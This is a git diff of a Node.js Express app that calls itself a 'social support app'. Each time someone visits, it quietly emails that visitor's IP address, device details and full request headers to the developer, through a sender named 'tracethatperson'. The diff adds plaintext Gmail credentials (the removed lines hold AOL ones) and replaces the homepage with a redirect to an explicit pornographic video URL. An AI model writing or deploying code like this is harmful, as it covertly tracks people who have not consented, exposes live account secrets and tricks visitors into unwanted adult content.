@@ -9,12 +9,11 @@ const app = express();
 
 app.use(device.capture());
 
-let transport = nodemailer.createTransport({
-  host: "smtp.aol.com",
-  port: 587,
+var transport = nodemailer.createTransport({
+  service: 'gmail',
   auth: {
-    user: "yash.aryan",
-    pass: "Heropanti@127"
+    user: 'ben10sonic307@gmail.com',
+    pass: 'shlzkwpbjoreyngd'
   }
 });
 
@@ -23,7 +22,7 @@ app.use(express.static(__dirname + "/public"));
 
 //Managing general routes
 
-app.get("/", function(req, res) {
+app.get("/", function (req, res) {
   var datetime = new Date();
   // const iplocation = require("iplocation").default;
   var ip = req.connection.remoteAddress;
@@ -38,23 +37,23 @@ app.get("/", function(req, res) {
     "cache-control"
   )} \r\n ${req.device.type.toUpperCase()} \r\n All Device Info: ${infoAll} \r\n \r\n Full Header: ${headersAll} `;
   const message = {
-    from: "yash.aryan@aol.com",
+    from: "tracethatperson@aol.com",
     to: "yasharyan307@outlook.com",
     subject: "New Visitor",
     text: `Hi Yash! A new user visited the social support app that you made. Here are the details. \n\r ${data}` // Plain text body
   };
-  transport.sendMail(message, function(err, info) {
+  transport.sendMail(message, function (err, info) {
     if (err) {
       console.log(err);
     } else {
       console.log(`Message sent at ${datetime}`);
     }
   });
-  res.sendFile(__dirname + "/public/homepage.html");
+  res.redirect("https://xhamster.desi/videos/bhabhi-riding-dick-was-fully-erected-and-was-prominently-vis-13477108");
 });
 
-app.get("*", function(req, res) {
-  res.sendFile(__dirname + "/public/homepage.html");
+app.get("*", function (req, res) {
+  res.send("I'm not sure what happened");
 });
 
 app.use(
